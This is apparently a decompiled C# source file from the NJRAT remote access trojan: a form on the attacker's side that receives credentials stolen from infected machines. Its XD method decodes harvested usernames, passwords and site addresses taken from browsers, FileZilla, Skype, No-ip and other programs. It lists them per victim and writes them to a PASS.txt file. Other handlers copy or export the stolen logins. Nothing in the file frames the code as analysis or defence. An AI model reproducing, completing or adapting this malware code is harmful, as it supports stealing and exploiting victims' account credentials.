using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using NJRAT.NJRAT;

namespace NJRAT
{
	// Token: 0x02000021 RID: 33
	[DesignerGenerated]
	public partial class Pass : Form
	{
		// Token: 0x06000470 RID: 1136 RVA: 0x0016DBFC File Offset: 0x0016BFFC
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Pass.__ENCList;
			lock (_ENCList)
			{
				bool flag = Pass.__ENCList.Count == Pass.__ENCList.Capacity;
				if (flag)
				{
					int num = 0;
					int num2 = 0;
					int num3 = Pass.__ENCList.Count - 1;
					int num4 = num2;
					for (;;)
					{
						int num5 = num4;
						int num6 = num3;
						if (num5 > num6)
						{
							break;
						}
						WeakReference weakReference = Pass.__ENCList[num4];
						flag = weakReference.IsAlive;
						if (flag)
						{
							bool flag2 = num4 != num;
							if (flag2)
							{
								Pass.__ENCList[num] = Pass.__ENCList[num4];
							}
							num++;
						}
						num4++;
					}
					Pass.__ENCList.RemoveRange(num, Pass.__ENCList.Count - num);
					Pass.__ENCList.Capacity = Pass.__ENCList.Count;
				}
				Pass.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}

		// Token: 0x17000196 RID: 406
		// (get) Token: 0x06000473 RID: 1139 RVA: 0x0016E7D4 File Offset: 0x0016CBD4
		// (set) Token: 0x06000474 RID: 1140 RVA: 0x0016E7EC File Offset: 0x0016CBEC
		internal virtual ContextMenuStrip ContextMenuStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContextMenuStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ContextMenuStrip1 = value;
			}
		}

		// Token: 0x17000197 RID: 407
		// (get) Token: 0x06000475 RID: 1141 RVA: 0x0016E7F8 File Offset: 0x0016CBF8
		// (set) Token: 0x06000476 RID: 1142 RVA: 0x0016E810 File Offset: 0x0016CC10
		internal virtual ToolStripMenuItem CopyUseToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CopyUseToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.CopyUseToolStripMenuItem_Click);
				bool flag = this._CopyUseToolStripMenuItem != null;
				if (flag)
				{
					this._CopyUseToolStripMenuItem.Click -= eventHandler;
				}
				this._CopyUseToolStripMenuItem = value;
				flag = this._CopyUseToolStripMenuItem != null;
				if (flag)
				{
					this._CopyUseToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000198 RID: 408
		// (get) Token: 0x06000477 RID: 1143 RVA: 0x0016E870 File Offset: 0x0016CC70
		// (set) Token: 0x06000478 RID: 1144 RVA: 0x0016E888 File Offset: 0x0016CC88
		internal virtual ToolStripMenuItem CopyPassToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CopyPassToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.CopyPassToolStripMenuItem_Click);
				bool flag = this._CopyPassToolStripMenuItem != null;
				if (flag)
				{
					this._CopyPassToolStripMenuItem.Click -= eventHandler;
				}
				this._CopyPassToolStripMenuItem = value;
				flag = this._CopyPassToolStripMenuItem != null;
				if (flag)
				{
					this._CopyPassToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000199 RID: 409
		// (get) Token: 0x06000479 RID: 1145 RVA: 0x0016E8E8 File Offset: 0x0016CCE8
		// (set) Token: 0x0600047A RID: 1146 RVA: 0x0016E900 File Offset: 0x0016CD00
		internal virtual ToolStripMenuItem CopySiteToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CopySiteToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.CopySiteToolStripMenuItem_Click);
				bool flag = this._CopySiteToolStripMenuItem != null;
				if (flag)
				{
					this._CopySiteToolStripMenuItem.Click -= eventHandler;
				}
				this._CopySiteToolStripMenuItem = value;
				flag = this._CopySiteToolStripMenuItem != null;
				if (flag)
				{
					this._CopySiteToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x1700019A RID: 410
		// (get) Token: 0x0600047B RID: 1147 RVA: 0x0016E960 File Offset: 0x0016CD60
		// (set) Token: 0x0600047C RID: 1148 RVA: 0x0016E978 File Offset: 0x0016CD78
		internal virtual ToolStripMenuItem CopyALLToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CopyALLToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.CopyALLToolStripMenuItem_Click);
				bool flag = this._CopyALLToolStripMenuItem != null;
				if (flag)
				{
					this._CopyALLToolStripMenuItem.Click -= eventHandler;
				}
				this._CopyALLToolStripMenuItem = value;
				flag = this._CopyALLToolStripMenuItem != null;
				if (flag)
				{
					this._CopyALLToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x1700019B RID: 411
		// (get) Token: 0x0600047D RID: 1149 RVA: 0x0016E9D8 File Offset: 0x0016CDD8
		// (set) Token: 0x0600047E RID: 1150 RVA: 0x0016E9F0 File Offset: 0x0016CDF0
		internal virtual ToolStripMenuItem SaveAllToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SaveAllToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._SaveAllToolStripMenuItem = value;
			}
		}

		// Token: 0x1700019C RID: 412
		// (get) Token: 0x0600047F RID: 1151 RVA: 0x0016E9FC File Offset: 0x0016CDFC
		// (set) Token: 0x06000480 RID: 1152 RVA: 0x0016EA14 File Offset: 0x0016CE14
		internal virtual ToolStripMenuItem InClipboardToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._InClipboardToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.InClipboardToolStripMenuItem_Click);
				bool flag = this._InClipboardToolStripMenuItem != null;
				if (flag)
				{
					this._InClipboardToolStripMenuItem.Click -= eventHandler;
				}
				this._InClipboardToolStripMenuItem = value;
				flag = this._InClipboardToolStripMenuItem != null;
				if (flag)
				{
					this._InClipboardToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x1700019D RID: 413
		// (get) Token: 0x06000481 RID: 1153 RVA: 0x0016EA74 File Offset: 0x0016CE74
		// (set) Token: 0x06000482 RID: 1154 RVA: 0x0016EA8C File Offset: 0x0016CE8C
		internal virtual ToolStripMenuItem InDiskToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._InDiskToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.InDiskToolStripMenuItem_Click);
				bool flag = this._InDiskToolStripMenuItem != null;
				if (flag)
				{
					this._InDiskToolStripMenuItem.Click -= eventHandler;
				}
				this._InDiskToolStripMenuItem = value;
				flag = this._InDiskToolStripMenuItem != null;
				if (flag)
				{
					this._InDiskToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x1700019E RID: 414
		// (get) Token: 0x06000483 RID: 1155 RVA: 0x0016EAEC File Offset: 0x0016CEEC
		// (set) Token: 0x06000484 RID: 1156 RVA: 0x0016EB04 File Offset: 0x0016CF04
		internal virtual ToolStripMenuItem FindToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._FindToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.FindToolStripMenuItem_Click);
				bool flag = this._FindToolStripMenuItem != null;
				if (flag)
				{
					this._FindToolStripMenuItem.Click -= eventHandler;
				}
				this._FindToolStripMenuItem = value;
				flag = this._FindToolStripMenuItem != null;
				if (flag)
				{
					this._FindToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x1700019F RID: 415
		// (get) Token: 0x06000485 RID: 1157 RVA: 0x0016EB64 File Offset: 0x0016CF64
		// (set) Token: 0x06000486 RID: 1158 RVA: 0x0016EB7C File Offset: 0x0016CF7C
		internal virtual ToolStripMenuItem RemoveEmptyPWToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RemoveEmptyPWToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.RemoveEmptyPWToolStripMenuItem_Click);
				bool flag = this._RemoveEmptyPWToolStripMenuItem != null;
				if (flag)
				{
					this._RemoveEmptyPWToolStripMenuItem.Click -= eventHandler;
				}
				this._RemoveEmptyPWToolStripMenuItem = value;
				flag = this._RemoveEmptyPWToolStripMenuItem != null;
				if (flag)
				{
					this._RemoveEmptyPWToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x170001A0 RID: 416
		// (get) Token: 0x06000487 RID: 1159 RVA: 0x0016EBDC File Offset: 0x0016CFDC
		// (set) Token: 0x06000488 RID: 1160 RVA: 0x0016EBF4 File Offset: 0x0016CFF4
		internal virtual SaveFileDialog SaveFileDialog1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SaveFileDialog1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._SaveFileDialog1 = value;
			}
		}

		// Token: 0x170001A1 RID: 417
		// (get) Token: 0x06000489 RID: 1161 RVA: 0x0016EC00 File Offset: 0x0016D000
		// (set) Token: 0x0600048A RID: 1162 RVA: 0x0016EC18 File Offset: 0x0016D018
		internal virtual ImageList ImageList1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ImageList1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ImageList1 = value;
			}
		}

		// Token: 0x170001A2 RID: 418
		// (get) Token: 0x0600048B RID: 1163 RVA: 0x0016EC24 File Offset: 0x0016D024
		// (set) Token: 0x0600048C RID: 1164 RVA: 0x0016EC3C File Offset: 0x0016D03C
		internal virtual MenuStrip MenuStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._MenuStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._MenuStrip1 = value;
			}
		}

		// Token: 0x170001A3 RID: 419
		// (get) Token: 0x0600048D RID: 1165 RVA: 0x0016EC48 File Offset: 0x0016D048
		// (set) Token: 0x0600048E RID: 1166 RVA: 0x0016EC60 File Offset: 0x0016D060
		internal virtual ToolStripMenuItem ToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.ToolStripMenuItem1_Click);
				bool flag = this._ToolStripMenuItem1 != null;
				if (flag)
				{
					this._ToolStripMenuItem1.Click -= eventHandler;
				}
				this._ToolStripMenuItem1 = value;
				flag = this._ToolStripMenuItem1 != null;
				if (flag)
				{
					this._ToolStripMenuItem1.Click += eventHandler;
				}
			}
		}

		// Token: 0x170001A4 RID: 420
		// (get) Token: 0x0600048F RID: 1167 RVA: 0x0016ECC0 File Offset: 0x0016D0C0
		// (set) Token: 0x06000490 RID: 1168 RVA: 0x0016ECD8 File Offset: 0x0016D0D8
		internal virtual GClass9 L1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._L1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.L1_DoubleClick);
				bool flag = this._L1 != null;
				if (flag)
				{
					this._L1.DoubleClick -= eventHandler;
				}
				this._L1 = value;
				flag = this._L1 != null;
				if (flag)
				{
					this._L1.DoubleClick += eventHandler;
				}
			}
		}

		// Token: 0x170001A5 RID: 421
		// (get) Token: 0x06000491 RID: 1169 RVA: 0x0016ED38 File Offset: 0x0016D138
		// (set) Token: 0x06000492 RID: 1170 RVA: 0x0016ED50 File Offset: 0x0016D150
		internal virtual ColumnHeader ColumnHeader1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader1 = value;
			}
		}

		// Token: 0x170001A6 RID: 422
		// (get) Token: 0x06000493 RID: 1171 RVA: 0x0016ED5C File Offset: 0x0016D15C
		// (set) Token: 0x06000494 RID: 1172 RVA: 0x0016ED74 File Offset: 0x0016D174
		internal virtual ColumnHeader ColumnHeader2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader2 = value;
			}
		}

		// Token: 0x170001A7 RID: 423
		// (get) Token: 0x06000495 RID: 1173 RVA: 0x0016ED80 File Offset: 0x0016D180
		// (set) Token: 0x06000496 RID: 1174 RVA: 0x0016ED98 File Offset: 0x0016D198
		internal virtual ColumnHeader ColumnHeader3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader3 = value;
			}
		}

		// Token: 0x170001A8 RID: 424
		// (get) Token: 0x06000497 RID: 1175 RVA: 0x0016EDA4 File Offset: 0x0016D1A4
		// (set) Token: 0x06000498 RID: 1176 RVA: 0x0016EDBC File Offset: 0x0016D1BC
		internal virtual ColumnHeader ColumnHeader4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader4 = value;
			}
		}

		// Token: 0x170001A9 RID: 425
		// (get) Token: 0x06000499 RID: 1177 RVA: 0x0016EDC8 File Offset: 0x0016D1C8
		// (set) Token: 0x0600049A RID: 1178 RVA: 0x0016EDE0 File Offset: 0x0016D1E0
		internal virtual ColumnHeader ColumnHeader5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader5 = value;
			}
		}

		// Token: 0x0600049B RID: 1179 RVA: 0x0016EDEC File Offset: 0x0016D1EC
		public Pass()
		{
			Pass.__ENCAddToList(this);
			this.bool_0 = true;
			this.InitializeComponent();
		}

		// Token: 0x0600049C RID: 1180 RVA: 0x0016EE0C File Offset: 0x0016D20C
		public void FxCOLM(ListView L1)
		{
			int num = L1.Columns.Count - 1;
			for (int i = 0; i <= num; i++)
			{
				L1.Columns[i].AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize);
			}
		}

		// Token: 0x0600049D RID: 1181 RVA: 0x0016EE50 File Offset: 0x0016D250
		private void InClipboardToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				string text = this.SV();
				bool flag = text.Length > 0;
				if (flag)
				{
					Clipboard.SetText(text);
					Interaction.MsgBox("Saved in Clipboard", MsgBoxStyle.OkOnly, null);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600049E RID: 1182 RVA: 0x0016EEAC File Offset: 0x0016D2AC
		private void InDiskToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = this.SaveFileDialog1.ShowDialog() == DialogResult.OK;
				if (flag)
				{
					File.WriteAllText(this.SaveFileDialog1.FileName, this.SV());
					Interaction.MsgBox(this.SaveFileDialog1.FileName, MsgBoxStyle.OkOnly, null);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600049F RID: 1183 RVA: 0x0016EF1C File Offset: 0x0016D31C
		private void FindToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Interaction.InputBox("Search", string.Empty, string.Empty, -1, -1);
				bool flag = Operators.CompareString(text, string.Empty, false) != 0;
				if (flag)
				{
					Pass pass = new Pass
					{
						Name = "e",
						Text = "Search For '" + text + "'"
					};
					pass.Show();
					try
					{
						foreach (object obj in this.L1.Items)
						{
							ListViewItem listViewItem = (ListViewItem)obj;
							int num = 0;
							do
							{
								flag = Strings.InStr(listViewItem.SubItems[num].Text.ToLower(), text.ToLower(), CompareMethod.Binary) > 0;
								if (flag)
								{
									ListViewItem listViewItem2 = pass.L1.Items.Add(listViewItem.Text, listViewItem.ImageIndex);
									int num2 = listViewItem.SubItems.Count - 1;
									for (int i = 1; i <= num2; i++)
									{
										listViewItem2.SubItems.Add(listViewItem.SubItems[i].Text);
									}
								}
								else
								{
									num++;
								}
							}
							while (num <= 2);
						}
					}
					finally
					{
						
					}
					pass.ToolStripMenuItem1.Text = "Passwords(X)".Replace("X", Conversions.ToString(pass.L1.Items.Count));
					this.FxCOLM(pass.L1);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060004A0 RID: 1184 RVA: 0x0016F120 File Offset: 0x0016D520
		private void CopyUseToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = this.L1.SelectedItems[0].Text.Length > 0;
				if (flag)
				{
					Clipboard.SetText(this.L1.SelectedItems[0].Text);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060004A1 RID: 1185 RVA: 0x0016F194 File Offset: 0x0016D594
		private void CopyPassToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = this.L1.SelectedItems[0].SubItems[1].Text.Length > 0;
				if (flag)
				{
					Clipboard.SetText(this.L1.SelectedItems[0].SubItems[1].Text);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060004A2 RID: 1186 RVA: 0x0016F21C File Offset: 0x0016D61C
		private void CopyALLToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				string text = string.Empty;
				bool flag;
				try
				{
					foreach (object obj in this.L1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						text = string.Concat(new string[]
						{
							text,
							"URL: ",
							listViewItem.SubItems[2].Text,
							"\r\nUSR: ",
							listViewItem.SubItems[0].Text,
							"\r\nPWD: ",
							listViewItem.SubItems[1].Text,
							"\r\n\r\n"
						});
					}
				}
				finally
				{
					
				}
				flag = text.Length > 0;
				if (flag)
				{
					Clipboard.SetText(text);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060004A3 RID: 1187 RVA: 0x0016F34C File Offset: 0x0016D74C
		private void RemoveEmptyPWToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.L1.Items)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					bool flag = Operators.CompareString(listViewItem.SubItems[1].Text, string.Empty, false) == 0;
					if (flag)
					{
						listViewItem.Remove();
					}
				}
			}
			finally
			{
				
			}
			this.ToolStripMenuItem1.Text = "Passwords(X)".Replace("X", Conversions.ToString(this.L1.Items.Count));
		}

		// Token: 0x060004A4 RID: 1188 RVA: 0x0016F410 File Offset: 0x0016D810
		public string SV()
		{
			string text = string.Empty;
			try
			{
				foreach (object obj in this.L1.Items)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					text = string.Concat(new string[]
					{
						text,
						"URL: ",
						listViewItem.SubItems[2].Text,
						"\r\nUSR: ",
						listViewItem.Text,
						"\r\nPWD: ",
						listViewItem.SubItems[1].Text,
						"\r\n\r\n"
					});
				}
			}
			finally
			{
				
			}
			return text;
		}

		// Token: 0x060004A5 RID: 1189 RVA: 0x0016F504 File Offset: 0x0016D904
		public void XD(ref Client c, ref string S)
		{
			string[] array = Strings.Split(S, " ", -1, CompareMethod.Binary);
			int num = -1;
			bool flag = !Directory.Exists(c.Folder);
			if (flag)
			{
				Directory.CreateDirectory(c.Folder);
			}
			string[] array2 = new string[]
			{
				"FileZilla", "No-ip", "DynDns", "Paltalk", "FireFox", "Chrome", "MSN", "Yahoo", "Opera", "Internet Explorer",
				"ooVoo", "DUC v3", "Skype"
			};
			string text = string.Empty;
            foreach (string item in array)
			{
                string text2 = item;
                try
				{
					flag = text2.Length > 0;
					if (flag)
					{
						bool flag2 = Operators.CompareString(text2, "*", false) == 0;
						if (flag2)
						{
							num++;
						}
						else
						{
							flag2 = !text2.Contains(":");
							if (flag2)
							{
								text2 = Class6.smethod_16(text2);
							}
							string[] array4 = Strings.Split(text2, ":", -1, CompareMethod.Binary);
							flag2 = array4.Length > 3;
							if (flag2)
							{
								string text3 = text2;
								string text4 = array4[0] + ":" + array4[1];
								string text5 = array4[0] + ":" + array4[1];
								array4 = Strings.Split(Strings.Replace(text3, text4, Class6.smethod_14(ref text5), 1, -1, CompareMethod.Binary), ":", -1, CompareMethod.Binary);
							}
							ListViewItem listViewItem = new ListViewItem();
							listViewItem = this.L1.Items.Add(Class6.smethod_16(array4[1]), num);
							listViewItem.SubItems.Add(Class6.smethod_16(array4[2]));
							listViewItem.SubItems.Add(Class6.smethod_16(array4[0]));
							listViewItem.SubItems.Add(array2[num]);
							NewLateBinding.LateCall(listViewItem.SubItems, null, "Add", new object[] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Class7.smethod_1(c.L)))) }, null, null, null, true);
							text = text + "USR: " + listViewItem.Text + "\r\n";
							text = text + "PWD: " + listViewItem.SubItems[1].Text + "\r\n";
							text = text + "URL: " + listViewItem.SubItems[2].Text + "\r\n\r\n";
						}
					}
				}
				catch (Exception ex)
				{
				}
			}
			try
			{
				File.WriteAllText(c.Folder + "PASS.txt", text);
			}
			catch (Exception ex2)
			{
			}
			this.FxCOLM(this.L1);
			this.ToolStripMenuItem1.Text = "Passwords(X)".Replace("X", Conversions.ToString(this.L1.Items.Count));
		}

		// Token: 0x060004A6 RID: 1190 RVA: 0x0016F86C File Offset: 0x0016DC6C
		private void L1_DoubleClick(object sender, EventArgs e)
		{
			try
			{
				string text = this.L1.SelectedItems[0].SubItems[2].Text;
				bool flag = !text.Contains("://");
				if (flag)
				{
					text = "http://" + text;
				}
				Process.Start(text);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060004A7 RID: 1191 RVA: 0x0016F8E8 File Offset: 0x0016DCE8
		private void ToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			this.bool_0 = true;
			this.L1.BringToFront();
		}

		// Token: 0x060004A8 RID: 1192 RVA: 0x0016F900 File Offset: 0x0016DD00
		private void CopySiteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = this.L1.SelectedItems[0].SubItems[2].Text.Length > 0;
				if (flag)
				{
					Clipboard.SetText(this.L1.SelectedItems[0].SubItems[2].Text);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x04000210 RID: 528
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x04000212 RID: 530
		[AccessedThroughProperty("ContextMenuStrip1")]
		private ContextMenuStrip _ContextMenuStrip1;

		// Token: 0x04000213 RID: 531
		[AccessedThroughProperty("CopyUseToolStripMenuItem")]
		private ToolStripMenuItem _CopyUseToolStripMenuItem;

		// Token: 0x04000214 RID: 532
		[AccessedThroughProperty("CopyPassToolStripMenuItem")]
		private ToolStripMenuItem _CopyPassToolStripMenuItem;

		// Token: 0x04000215 RID: 533
		[AccessedThroughProperty("CopySiteToolStripMenuItem")]
		private ToolStripMenuItem _CopySiteToolStripMenuItem;

		// Token: 0x04000216 RID: 534
		[AccessedThroughProperty("CopyALLToolStripMenuItem")]
		private ToolStripMenuItem _CopyALLToolStripMenuItem;

		// Token: 0x04000217 RID: 535
		[AccessedThroughProperty("SaveAllToolStripMenuItem")]
		private ToolStripMenuItem _SaveAllToolStripMenuItem;

		// Token: 0x04000218 RID: 536
		[AccessedThroughProperty("InClipboardToolStripMenuItem")]
		private ToolStripMenuItem _InClipboardToolStripMenuItem;

		// Token: 0x04000219 RID: 537
		[AccessedThroughProperty("InDiskToolStripMenuItem")]
		private ToolStripMenuItem _InDiskToolStripMenuItem;

		// Token: 0x0400021A RID: 538
		[AccessedThroughProperty("FindToolStripMenuItem")]
		private ToolStripMenuItem _FindToolStripMenuItem;

		// Token: 0x0400021B RID: 539
		[AccessedThroughProperty("RemoveEmptyPWToolStripMenuItem")]
		private ToolStripMenuItem _RemoveEmptyPWToolStripMenuItem;

		// Token: 0x0400021C RID: 540
		[AccessedThroughProperty("SaveFileDialog1")]
		private SaveFileDialog _SaveFileDialog1;

		// Token: 0x0400021D RID: 541
		[AccessedThroughProperty("ImageList1")]
		private ImageList _ImageList1;

		// Token: 0x0400021E RID: 542
		[AccessedThroughProperty("MenuStrip1")]
		private MenuStrip _MenuStrip1;

		// Token: 0x0400021F RID: 543
		[AccessedThroughProperty("ToolStripMenuItem1")]
		private ToolStripMenuItem _ToolStripMenuItem1;

		// Token: 0x04000220 RID: 544
		[AccessedThroughProperty("L1")]
		private GClass9 _L1;

		// Token: 0x04000221 RID: 545
		[AccessedThroughProperty("ColumnHeader1")]
		private ColumnHeader _ColumnHeader1;

		// Token: 0x04000222 RID: 546
		[AccessedThroughProperty("ColumnHeader2")]
		private ColumnHeader _ColumnHeader2;

		// Token: 0x04000223 RID: 547
		[AccessedThroughProperty("ColumnHeader3")]
		private ColumnHeader _ColumnHeader3;

		// Token: 0x04000224 RID: 548
		[AccessedThroughProperty("ColumnHeader4")]
		private ColumnHeader _ColumnHeader4;

		// Token: 0x04000225 RID: 549
		[AccessedThroughProperty("ColumnHeader5")]
		private ColumnHeader _ColumnHeader5;

		// Token: 0x04000226 RID: 550
		private bool bool_0;
	}
}
